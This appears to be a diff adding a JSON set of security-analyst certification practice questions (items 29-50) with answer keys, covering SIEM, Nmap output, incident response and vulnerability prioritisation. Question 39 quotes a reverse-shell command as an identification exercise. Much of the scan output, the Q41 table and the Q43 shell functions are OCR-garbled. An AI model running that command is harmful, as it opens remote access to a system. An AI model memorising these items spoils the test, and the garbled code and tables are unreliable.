@@ -1,0 +1,267 @@
+[
+  {
+    "question_number": "29",
+    "question_text": "A security program was able to achieve a 30% improvement in MTTR by integrating security controls into a SIEM. The analyst no longer had to jump between tools. Which of the following best describes what the security program did?",
+    "image": null,
+    "options": {
+      "A": "Data enrichment",
+      "B": "Security control plane",
+      "C": "Threat feed combination",
+      "D": "Single pane of glass  "
+    },
+    "correct_answer": "D"
+  },
+  {
+    "question_number": "30",
+    "question_text": "Due to reports of unauthorized activity that was occurring on the internal network, an analyst is performing a network discovery. The analyst runs\n\nan Nmap scan against a corporate network to evaluate which devices were operating in the environment. Given the following output:\n\nNmap scan report for officerokuplayer.lan (192.168.86.22)\n\nHost is up (0.11s latency).\n\nAll 100 scanned ports on officerokuplayer.lan (192.168.86.22) are filtered\n\nMAC Address: B8:38:59:86:1A:13 (Roku)\n\nNmap scan report for piwnp1_alca.lan (192.168.86.56)\n\nHost is up (0.022s latency).\n\nNot shown: 96 closed ports\n\nPORT\n\nSTATE SERVICE\n\n22/tcp\n\nopen\n\nssh\n\n111/tcp open\n\nrpcbind\n\n139/tcp open\n\nnetbios-ssn\n\n445/tcp open\n\nmicrosoft-ds\n\n8000/tcp open http-alt\n\nMAC Address: B8:27:EB:D0:8E:D1 (Raspberry Pi Foundation)\n\nNmap scan report for wh4dc-748gy.lan (192.168.86.152)\n\nHost is up (0.033s latency).\n\nNot shown: 95 filtered ports\n\nPORT\n\nSTATE SERVICE\n\n80/tcp\n\nopen http\n\n135/tcp\n\nopen msrpo\n\n139/tcp\n\nopen\n\nnetbios-ssn\n\n443/tcp\n\nopen\n\nhttps\n\n139/top\n\nopen\n\nnetbios-sen\n\n445/top\n\nopen\n\nmicrosoft-ds\n\n3389/tcp open\n\nms-wot-server\n\n5357/tcp open\n\nwsdapi\n\nMAC Address: 38:BA:F8:E3:41:CB (Intel Corporate)\n\nNmap scan report for xlaptop.lan (192.168.86.249)\n\nHost is up (0.024s latency).\n\nNot shown: 93 filtered ports\n\nPORT\n\nSTATE SERVICE\n\n22/tcp\n\nopen ssh\n\n135/tcp\n\nopen\n\nmsrpc\n\n139/tcp\n\nopen\n\nnetbios-ssn.\n\n443/tcp\n\nopen\n\nhttps\n\n445/tcp\n\nopen\n\nmicrosoft-ds\n\n3389/top open\n\nms-wbt-server\n\n5357/tcp open\n\nwsdapi\n\nMAC Address: 64:00:6A:SE:D8:F5 (Dell)\n\nNmap scan report for imaging.lan (192.168.86.150)\n\nHost is up (0.0013s latency).\n\nNot shown: 95 closed ports\n\nPORT\n\nSTATE SERVICE\n\n135/tcp open\n\nmsrpc\n\n139/tcp\n\nopen\n\n445/tcp\n\nopen\n\n3389/tcp open\n\n5357/tcp open\n\nnetbios-ssn\n microsoft-de\n\nms-wbt-server\n wsdapi\n\nMAC Address: 38:BA:F8:F4:32:CA (Intel Corporate)\n\nWhich of the following choices should the analyst look at first?",
+    "image": null,
+    "options": {
+      "A": "wh4dc-748gy.lan (192.168.86.152)",
+      "B": "officerckuplayer.lan (192.168.86.22)",
+      "C": "imaging.lan (192.168.86.150)",
+      "D": "xlaptop.lan (192.168.86.249)",
+      "E": "p4wnp1_aloa.lan (192.168.86.56)  "
+    },
+    "correct_answer": "E"
+  },
+  {
+    "question_number": "31",
+    "question_text": "When starting an investigation, which of the following must be done first?",
+    "image": null,
+    "options": {
+      "A": "Notify law enforcement",
+      "B": "Secure the scene  ",
+      "C": "Seize all related evidence",
+      "D": "Interview the witnesses"
+    },
+    "correct_answer": "B"
+  },
+  {
+    "question_number": "32",
+    "question_text": "Which of the following describes how a CSIRT lead determines who should be communicated with and when during a security incident?",
+    "image": null,
+    "options": {
+      "A": "The lead should review what is documented in the incident response policy or plan  ",
+      "B": "Management level members of the CSIRT should make that decision",
+      "C": "The lead has the authority to decide who to communicate with at any t me",
+      "D": "Subject matter experts on the team should communicate with others within the specified area of expertise"
+    },
+    "correct_answer": "A"
+  },
+  {
+    "question_number": "33",
+    "question_text": "A new cybersecurity analyst is tasked with creating an executive briefing on possible threats to the organization. Which of the following will\n produce the data needed for the briefing?",
+    "image": null,
+    "options": {
+      "A": "Firewall logs",
+      "B": "Indicators of compromise",
+      "C": "Risk assessment  ",
+      "D": "Access control lists"
+    },
+    "correct_answer": "C"
+  },
+  {
+    "question_number": "34",
+    "question_text": "An analyst notices there is an internal device sending HTTPS traffic with additional characters in the header to a known-malicious IP in another\n country. Which of the following describes what the analyst has noticed?",
+    "image": null,
+    "options": {
+      "A": "Beaconing  ",
+      "B": "Cross-site scripting",
+      "C": "Buffer overflow",
+      "D": "PHP traversal"
+    },
+    "correct_answer": "A"
+  },
+  {
+    "question_number": "35",
+    "question_text": "A security analyst is reviewing a packet capture in Wireshark that contains an FTP session from a potentially compromised machine. The analyst\n sets the following display filter: ftp. The analyst can see there are several RETR requests with 226 Transfer complete responses, but the packet list\n pane is not showing the packets containing the file transfer itself. Which of the following can the analyst perform to see the entire contents of the\n downloaded files?",
+    "image": null,
+    "options": {
+      "A": "Change the display filter to ftp.active.port",
+      "B": "Change the display filter to tcp.port $z=20$",
+      "C": "Change the display filter to ftp-data and follow the TCP streams  ",
+      "D": "Navigate to the File menu and select FTP from the Export objects option"
+    },
+    "correct_answer": "C"
+  },
+  {
+    "question_number": "36",
+    "question_text": "A SOC manager receives a phone call from an upset customer. The customer received a vulnerability report two hours ago: but the report did not\n have a follow-up remediation response from an analyst. Which of the following documents should the SOC manager review to ensure the team is\n meeting the appropriate contractual obligations for the customer?",
+    "image": null,
+    "options": {
+      "A": "SLA  ",
+      "B": "MOU",
+      "C": "NDA",
+      "D": "Limitation of liability"
+    },
+    "correct_answer": "A"
+  },
+  {
+    "question_number": "37",
+    "question_text": "Which of the following phases of the Cyber Kill Chain involves the adversary attempting to establish communication with a successfully exploited\n target?",
+    "image": null,
+    "options": {
+      "A": "Command and control  ",
+      "B": "Actions on objectives",
+      "C": "Exploitation",
+      "D": "Delivery"
+    },
+    "correct_answer": "A"
+  },
+  {
+    "question_number": "38",
+    "question_text": "A company that has a geographically diverse workforce and dynamic IPs wants to implement a vulnerability scanning method with reduced\n network traffic. Which of the following would best meet this requirement?",
+    "image": null,
+    "options": {
+      "A": "External",
+      "B": "Agent-based  ",
+      "C": "Non-credentialed",
+      "D": "Credentialed"
+    },
+    "correct_answer": "B"
+  },
+  {
+    "question_number": "39",
+    "question_text": "A security analyst detects an exploit attempt containing the following command: sh -i >& /dev/udp/10.1.1.1/4821 0>$ \n Which of the following is being attempted?",
+    "image": null,
+    "options": {
+      "A": "RCE",
+      "B": "Reverse shell  ",
+      "C": "XSS",
+      "D": "SQL injection"
+    },
+    "correct_answer": "B"
+  },
+  {
+    "question_number": "40",
+    "question_text": "An older CVE with a vulnerability score of 7.1 was elevated to a score of 9.8 due to a widely available exploit being used to deliver ransomware.\n Which of the following factors would an analyst most likely communicate as the reason for this escalation?",
+    "image": null,
+    "options": {
+      "A": "Scope",
+      "B": "Weaponization  ",
+      "C": "CVSS",
+      "D": "Asset value"
+    },
+    "correct_answer": "B"
+  },
+  {
+    "question_number": "41",
+    "question_text": "An analyst is reviewing a vulnerability report for a server environment with the following entries:\n\nVulnerability Severity v3\n\nCrown Exploit\n jewel\n\navailable\n\nEOL/Obsolete\n\n5\n\n54 73.224.15 No\n\nNo\n\nLog4j v1 x\n\nEOL/Obsolete\n\n54 73 225 17 Yes\n\nNo\n\nLog4j vi x\n\nEOL/Obsolete\n\n5\n\n10 101 27 98\n\nYes\n\nNo\n\nLog4j v1 x\n\nMicrosoft\n\nWindows\n\n4\n\n8.2\n\n10 100 10 52\n\nNo\n\nYes\n\nSecurity\n\nUpdate\n\nMicrosoft\n\nWindows\n\n4\n\n8.2\n\n54 74.110 26\n\nNo\n\nYes\n\nSecunity\n\nUpdate\n\nMicrosoft\n\nWindows\n\n4\n\n8.2\n\n54 74.110 228 Yes\n\nYes\n\nSecurity\n\nUpdate\n\nOracle Java\n\n3\n\n6.9\n\n10 101.25.65 Yes\n\nNo\n\nCntical Patch\n\nOracle Java\n\n3\n\n69\n\n54 73 225 17\n\nYes\n\nNo\n\nCritical Patch\n\nOracle Java\n\n3\n\n69\n\n10 101.27 98 Yes\n\nNo\n\nCritical Patch\n\nWhich of the following systems should be prioritized for patching first?",
+    "image": null,
+    "options": {
+      "A": "10.101.27.98",
+      "B": "54.73.225.17",
+      "C": "54.74.110.26",
+      "D": "54.74.110.228  "
+    },
+    "correct_answer": "D"
+  },
+  {
+    "question_number": "42",
+    "question_text": "A company is in the process of implementing a vulnerability management program, and there are concerns about granting the security team.\n access to sensitive data. Which of the following scanning methods can be implemented to reduce the access to systems while providing the most\n accurate vulnerability scan results?",
+    "image": null,
+    "options": {
+      "A": "Credentialed network scanning",
+      "B": "Passive scanning",
+      "C": "Agent-based scanning  ",
+      "D": "Dynamic scanning"
+    },
+    "correct_answer": "C"
+  },
+  {
+    "question_number": "43",
+    "question_text": "A security analyst is trying to identify anomalies on the network routing. Which of the following functions can the analyst use on a shell script to\n achieve the objective most accurately?",
+    "image": null,
+    "options": {
+      "A": "function x() ${info=$(geoiplookup$1)$8echo\"$1|$info^{\\prime\\prime}}$",
+      "B": "function x() { $(info=$(ping-c~1~S1|awk-F^{\\prime\\prime}/^{\\prime\\prime}END\\{print~\\$5\\}^{\\prime})$ && echo \"\\$1 | \\$info\" }",
+      "C": "function x() {info=$(dig $(dig -x $1 | grep PTR | tail -n 1 | awk -F\".in-addr\" ' print $1}').origin.asn.cymru.com TXT +short) && echo \"$1 |\n $info\")",
+      "D": "function x() {info=$(traceroute -m 40 $1 | awk 'END print $1}') && echo \"$1 | $info\"}  "
+    },
+    "correct_answer": "D"
+  },
+  {
+    "question_number": "44",
+    "question_text": "There are several reports of sensitive information being disclosed via file sharing services. The company would like to improve its security posture\n against this threat. Which of the following security controls would best support the company in this scenario?",
+    "image": null,
+    "options": {
+      "A": "Implement step-up authentication for administrators",
+      "B": "Improve employee training and awareness  ",
+      "C": "Increase password complexity standards",
+      "D": "Deploy mobile device management"
+    },
+    "correct_answer": "B"
+  },
+  {
+    "question_number": "45",
+    "question_text": "Which of the following is the best way to begin preparation for a report titled \"What We Learned\" regarding a recent incident involving a\n cybersecurity breach?",
+    "image": null,
+    "options": {
+      "A": "Determine the sophistication of the audience that the report is meant for  ",
+      "B": "Include references and sources of information on the first page",
+      "C": "Include a table of contents outlining the entire report",
+      "D": "Decide on the color scheme that will effectively communicate the metrics"
+    },
+    "correct_answer": "A"
+  },
+  {
+    "question_number": "46",
+    "question_text": "A security analyst is performing an investigation involving multiple targeted Windows malware binaries. The analyst wants to gather intelligence\n without disclosing information to the attackers. Which of the following actions would allow the analyst to achieve the objective?",
+    "image": null,
+    "options": {
+      "A": "Upload the binary to an air gapped sandbox for analysis  ",
+      "B": "Send the binaries to the antivirus vendor",
+      "C": "Execute the binaries on an environment with internet connectivity",
+      "D": "Query the file hashes using Virus Total"
+    },
+    "correct_answer": "A"
+  },
+  {
+    "question_number": "47",
+    "question_text": "Which of the following would help to minimize human engagement and aid in process improvement in security operations?",
+    "image": null,
+    "options": {
+      "A": "OSSTMM",
+      "B": "SIEM",
+      "C": "SOAR  ",
+      "D": "OWASP"
+    },
+    "correct_answer": "C"
+  },
+  {
+    "question_number": "48",
+    "question_text": "After conducting a cybersecurity risk assessment for a new software request, a Chief Information Security Officer (CISO) decided the risk score\n would be too high. The CISO refused the software request. Which of the following risk management principles did the CISO select?",
+    "image": null,
+    "options": {
+      "A": "Avoid  ",
+      "B": "Transfer",
+      "C": "Accept",
+      "D": "Mitigate"
+    },
+    "correct_answer": "A"
+  },
+  {
+    "question_number": "49",
+    "question_text": "Which of the following is an important aspect that should be included in the lessons-learned step after an incident?",
+    "image": null,
+    "options": {
+      "A": "Identify any improvements or changes in the incident response plan or procedures  ",
+      "B": "Determine if an internal mistake was made and who did it so they do not repeat the error",
+      "C": "Present all legal evidence collected and turn it over to iaw enforcement",
+      "D": "Discuss the financial impact of the incident to determine if security controls are well spent"
+    },
+    "correct_answer": "A"
+  },
+  {
+    "question_number": "50",
+    "question_text": "The security operations team is required to consolidate several threat intelligence feeds due to redundant tools and portals. Which of the\n following will best achieve the goal and maximize results?",
+    "image": null,
+    "options": {
+      "A": "Single pane of glass  ",
+      "B": "Single sign-on",
+      "C": "Data enrichment",
+      "D": "Deduplication"
+    },
+    "correct_answer": "A"
+  }
+]
